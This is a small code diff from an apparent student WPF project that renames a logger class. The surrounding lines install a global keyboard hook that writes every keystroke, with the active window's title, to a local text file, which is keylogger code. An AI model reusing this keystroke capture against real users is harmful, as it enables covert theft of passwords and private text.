@@ -51,7 +51,7 @@ namespace AbschlussprojektWPF
 
             using (var api = new KeystrokeAPI())
             {
-                Logger logFile = new Logger(); 
+                clsLogger logFile = new clsLogger(); 
                 KeystrokeAPI ki = new KeystrokeAPI();
                 api.CreateKeyboardHook((character) => { File.AppendAllText(@"D:\KeyLog.txt", character + " " + logFile.GetTitleOfActiveWindow() + "\r\n\r\n"); ; });
             }
